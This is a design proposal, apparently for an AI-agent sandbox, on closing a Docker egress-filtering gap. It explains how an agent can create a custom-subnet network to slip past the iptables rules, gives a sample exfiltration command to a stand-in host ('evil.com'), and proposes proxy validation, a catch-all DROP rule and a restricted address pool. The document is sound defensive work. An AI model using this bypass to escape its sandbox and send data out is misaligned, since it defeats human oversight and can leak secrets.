# Docker Network Lockdown: Closing the Custom-Subnet Egress Bypass

Status: **Proposal**

## The Gap

Today an agent can bypass Docker egress filtering:

```bash
# Agent creates a network with an unknown subnet
docker network create --subnet=172.50.0.0/16 escape-net

# Container on this subnet hits the final ACCEPT in DOCKER-USER
docker run --network=escape-net alpine curl https://evil.com/?key=stolen
```

Our iptables chain looks like:

```
ACCEPT  172.30.0.0/24 → 172.30.0.0/24     (iso-acm: container-to-container)
ACCEPT  172.30.0.0/24 → <allowed IPs>      (iso-acm: whitelisted)
DROP    172.30.0.0/24 → *                   (iso-acm: everything else)
...per-user rules...
DROP    172.17.0.0/16 → *                   (default bridge)
ACCEPT  * → *                               (everything else — THE GAP)
```

The final `ACCEPT` is needed for admin's own containers and Docker infrastructure traffic. But it also allows any unknown subnet.

## Solution: Two-Layer Defense

### Layer 1: Proxy validates `/networks/create` body

Inspect the JSON body of `POST /networks/create` requests. Enforce:

1. **Subnet must be in the user's assigned range** (`172.30.N.0/24`) or empty (Docker assigns automatically from its pool)
2. **Driver must be `bridge`** (reject `host`, `macvlan`, `ipvlan`, `overlay`)
3. **No `Options.com.docker.network.bridge.name`** (prevents hijacking existing bridges)
4. **`Internal` is allowed** (blocks all egress — stricter than our rules)

```python
def check_network_create(body_bytes, user):
    data = json.loads(body_bytes)
    
    # Driver: only bridge
    driver = data.get("Driver", "bridge")
    if driver != "bridge":
        return False, f"network driver {driver!r} not allowed"
    
    # IPAM: if subnet specified, must be in user's range
    ipam = data.get("IPAM", {})
    for cfg in ipam.get("Config", []):
        subnet = cfg.get("Subnet", "")
        if subnet and not subnet.startswith(f"172.30.{user_index}."):
            return False, f"subnet {subnet} outside user's range"
    
    # No bridge name override
    opts = data.get("Options", {})
    if "com.docker.network.bridge.name" in opts:
        return False, "custom bridge name not allowed"
    
    return True, ""
```

### Layer 2: iptables DROP for all non-isolator subnets

Replace the final `ACCEPT` with a targeted approach:

```
# Per-user rules (existing)
ACCEPT  172.30.0.0/24 → 172.30.0.0/24     (iso-acm)
ACCEPT  172.30.0.0/24 → <allowed>          (iso-acm)
DROP    172.30.0.0/24 → *                   (iso-acm)
...

# Block default bridge (existing)
DROP    172.17.0.0/16 → *

# Allow Docker infrastructure (DNS, inter-network routing)
ACCEPT  * → 127.0.0.0/8                    (localhost)
ACCEPT  * -m state --state ESTABLISHED,RELATED   (return traffic)

# Block the entire isolator subnet range — catch custom subnets
DROP    172.30.0.0/16 → *                   (any 172.30.x.x not caught above)

# Admin's containers on other ranges pass through
ACCEPT  * → *
```

The key addition: `DROP 172.30.0.0/16` catches any container in the 172.30.x.x range that wasn't explicitly allowed by per-user rules above. An agent that creates a network with `--subnet=172.30.99.0/24` (outside their assigned /24) gets dropped.

For subnets completely outside 172.30.0.0/16 (e.g., 172.50.0.0/16), the proxy's `/networks/create` validation prevents creating them.

### Combined defense

| Attack | Layer 1 (Proxy) | Layer 2 (iptables) |
|--------|----------------|-------------------|
| `--subnet=172.30.99.0/24` | Blocked (outside user's /24) | Dropped (172.30.0.0/16 catch-all) |
| `--subnet=172.50.0.0/16` | Blocked (outside 172.30.x.x) | Falls through to ACCEPT (admin range) |
| No subnet (Docker auto-assigns) | Allowed | Docker assigns from its pool (usually 172.x) — need to ensure pool is restricted |
| `--driver=host` | Blocked | N/A |
| `--driver=macvlan` | Blocked | N/A |

### Edge case: Docker auto-assigned subnets

When no subnet is specified, Docker picks from its address pool. By default this is `172.17.0.0/12` — a huge range. Containers on auto-assigned subnets outside our per-user rules hit the `DROP 172.30.0.0/16` (if in that range) or the final `ACCEPT` (if outside).

To fully close this:

**Option A:** Configure Docker daemon's `default-address-pools` to only use `172.30.0.0/16`:

```json
{
  "default-address-pools": [
    {"base": "172.30.0.0/16", "size": 24}
  ]
}
```

Then the iptables `DROP 172.30.0.0/16` catch-all covers everything Docker creates.

**Option B:** Don't allow auto-assigned subnets — always require explicit subnet in proxy validation. But testcontainers doesn't specify subnets.

**Option C (recommended):** Apply Option A (restrict Docker's pool) + Layer 2 (catch-all DROP). This way:
- All Docker networks are in 172.30.0.0/16
- Per-user rules allow their /24
- Catch-all DROP blocks everything else in 172.30.0.0/16
- No subnet can escape

## Implementation plan

### Phase 1: Proxy validation (low effort)

Add `check_network_create()` to `bin/docker-proxy`:
- Validate driver, subnet, options on `POST /networks/create`
- User's subnet range derived from their position in config (same as `user_subnet()`)

### Phase 2: iptables catch-all (low effort)

Update `generate_docker_iptables()` in `bin/iso`:
- Add `DROP 172.30.0.0/16` before the final `ACCEPT`

### Phase 3: Docker daemon pool restriction (medium effort)

Configure OrbStack's Docker daemon:
```bash
orbctl config docker  # opens ~/.orbstack/config/docker.json
```

Add:
```json
{
  "default-address-pools": [
    {"base": "172.30.0.0/16", "size": 24}
  ]
}
```

Restart OrbStack. All new networks get subnets from 172.30.0.0/16 only.

Add to `install.sh` as part of Docker setup.

### Phase 4: Existing network cleanup

Re-create existing `iso-*` networks with correct subnets if they're outside 172.30.0.0/16:
```bash
iso pf  # recreates iptables with catch-all
```

## Risk assessment

| Before (current) | After (proposed) |
|---|---|
| Agent creates 172.50.0.0/16 → unrestricted egress | Proxy blocks (outside 172.30.x) |
| Agent creates 172.30.99.0/24 → unrestricted egress | iptables DROP (172.30.0.0/16 catch-all) |
| Docker auto-assigns 172.18.0.0/16 → unrestricted | Docker pool restricted to 172.30.x |
| Agent uses `--driver=macvlan` → host network access | Proxy blocks non-bridge drivers |

## Dependencies

- No new packages
- OrbStack daemon restart needed for address pool change
- Existing containers unaffected (rules apply to new traffic)
